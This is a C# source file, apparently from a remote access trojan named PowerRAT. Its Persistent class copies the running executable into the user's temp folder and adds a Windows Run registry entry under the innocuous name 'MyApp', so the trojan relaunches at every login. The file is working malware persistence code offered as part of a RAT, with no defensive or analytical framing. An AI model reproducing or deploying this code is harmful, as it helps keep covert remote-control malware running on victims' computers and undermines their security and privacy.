using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PowerRAT
{
    internal class Persistent
    {
        public static void Persistent_copy() {
            string sourceFilePath = PublicResource.Current_process_path; 
            Console.WriteLine(sourceFilePath);
            string tempFolderPath = Path.GetTempPath();
            string destFilePath = Path.Combine(tempFolderPath, Path.GetFileName(sourceFilePath));

            try
            {
                File.Copy(sourceFilePath, destFilePath, true);
                Console.WriteLine($"File copied to: {destFilePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
        public static void Persistent_main(){
            string entryName = "MyApp";
            string entryPath = PublicResource.Temp_folder_pạth + "\\PowerRAT.exe";
            Console.WriteLine(entryPath);
            string registryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue(entryName, entryPath, RegistryValueKind.String);
                        Console.WriteLine($"Registry entry '{entryName}' added successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Failed to access registry.");
                    }
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, false))
                {
                    object value = key?.GetValue(entryName);
                    Console.WriteLine($"Current registry value: {value}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}
